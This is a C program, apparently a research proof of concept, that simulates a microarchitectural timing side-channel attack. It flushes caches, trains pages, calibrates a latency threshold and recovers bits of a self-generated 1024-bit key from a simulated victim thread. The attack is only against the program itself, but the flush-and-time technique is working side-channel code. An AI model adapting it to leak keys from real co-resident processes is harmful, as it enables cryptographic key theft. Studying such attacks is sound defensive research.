#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <pthread.h>
#include <time.h>

#define PAGE_SIZE 4096
#define XPT_SIZE 256
#define THRESHOLD_VAL 32
#define KEY_BITS 1024  // 扩展至 1024 位
#define DUMMY_SIZE 128

static inline void clflush(volatile void *p) { asm volatile("clflush (%0)" :: "r"(p)); }
static inline void mfence() { asm volatile("mfence" ::: "memory"); }
static inline void lfence() { asm volatile("lfence" ::: "memory"); }
static inline uint64_t rdtscp() { unsigned int junk; return __rdtscp(&junk); }

void busy_wait(int cycles) {
    for (volatile int i = 0; i < cycles; i++);
}

int compare_uint32(const void *a, const void *b) {
    return (*(uint32_t*)a - *(uint32_t*)b);
}

void train_page(volatile char *addr) {
    for (int i = 0; i < THRESHOLD_VAL + 5; i++) {
        volatile char junk = *addr; mfence();
        clflush(addr); mfence();
    }
}

void flush_hardware_state(volatile char **dummy_pages) {
    for (int i = 0; i < DUMMY_SIZE; i++) {
        volatile char junk = *dummy_pages[i]; mfence();
        clflush(dummy_pages[i]); mfence();
    }
}

// ================= 多线程同步 =================
volatile int sync_state = 0; 
volatile int current_bit_val = 0;
volatile char *shared_victim_base = NULL;

void* victim_thread_func(void* arg) {
    while (1) {
        while (sync_state == 0 || sync_state == 2) {
            asm volatile("pause");
            if (sync_state == 3) return NULL;
        }
        if (sync_state == 3) return NULL;

        if (current_bit_val) {
            volatile char *vp = shared_victim_base;
            for (int repeat = 0; repeat < 10; repeat++) { 
                clflush(vp); mfence();
                volatile char junk = *vp; mfence();
                for (volatile int d = 0; d < 50; d++); 
            }
        }
        sync_state = 2; 
    }
    return NULL;
}

// ================= 攻击核心 =================
uint32_t probe_once(int bit_val, volatile char **attacker_pages, volatile char **dummy_pages) {
    flush_hardware_state(dummy_pages);

    // 1. Training
    for (int i = 0; i < XPT_SIZE; i++) train_page(attacker_pages[i]);
    mfence();

    // 2. Trigger Victim
    current_bit_val = bit_val;
    sync_state = 1; 

    while (sync_state != 2) { asm volatile("pause"); }

    // 3. Measure
    busy_wait(50); 
    clflush(attacker_pages[0]); mfence(); lfence();
    
    uint64_t start = rdtscp();
    lfence();
    volatile char junk = *attacker_pages[0]; mfence();
    uint32_t lat = (uint32_t)(rdtscp() - start);

    sync_state = 0; 
    return lat;
}

int main(int argc, char *argv[]) {
    srand(time(NULL));
    uint32_t threshold = 0;

    // 分配足够内存 (1024位RSA模拟需要较大偏移)
    size_t mem_size = 8000 * PAGE_SIZE; 
    char *buffer = (char *)aligned_alloc(PAGE_SIZE, mem_size);
    memset(buffer, 0x55, mem_size);

    volatile char *attacker_pages[XPT_SIZE];
    for (int i = 0; i < XPT_SIZE; i++) attacker_pages[i] = &buffer[i * PAGE_SIZE];
    shared_victim_base = &buffer[4000 * PAGE_SIZE];
    
    volatile char *dummy_pages[DUMMY_SIZE];
    for (int i = 0; i < DUMMY_SIZE; i++) dummy_pages[i] = &buffer[(6000 + i) * PAGE_SIZE];

    // 生成随机 1024 bit 密钥
    uint8_t secret_key[KEY_BITS / 8];
    for(int i = 0; i < KEY_BITS / 8; i++) secret_key[i] = rand() % 256;

    pthread_t victim_tid;
    pthread_create(&victim_tid, NULL, victim_thread_func, NULL);

    printf("=== XPT 1024-BIT RSA ATTACK SIMULATION ===\n");

    // 第一步：校准 (Calibrate)
    printf("[*] Calibrating...\n");
    uint32_t cal_samples[10];
    for(int i = 0; i < 10; i++) {
        cal_samples[i] = probe_once(0, attacker_pages, dummy_pages);
    }
    qsort(cal_samples, 10, sizeof(uint32_t), compare_uint32);
    threshold = cal_samples[5] + 25; 
    printf("CALIBRATED_THRESHOLD: %u\n", threshold);

    // 第二步：单轮扫描 (Single Pass Scan)
    printf("[*] Starting 1024-bit Scan...\n");
    int success_count = 0;
    
    for (int i = 0; i < KEY_BITS; i++) {
        int target_bit = (secret_key[i / 8] >> (i % 8)) & 1;
        uint32_t lat = probe_once(target_bit, attacker_pages, dummy_pages);
        
        int guessed_bit = (lat > threshold) ? 1 : 0;
        if (guessed_bit == target_bit) success_count++;

        if (i % 64 == 0) printf("\nProgress: %4d/%d ", i, KEY_BITS);
        printf("%d", guessed_bit);
    }

    // 结束线程
    sync_state = 3; 
    pthread_join(victim_tid, NULL);

    printf("\n\n=== ATTACK SUMMARY ===\n");
    printf("Total Bits: %d\n", KEY_BITS);
    printf("Correct Bits: %d\n", success_count);
    printf("Accuracy: %.2f%%\n", (double)success_count / KEY_BITS * 100);

    free(buffer);
    return 0;
}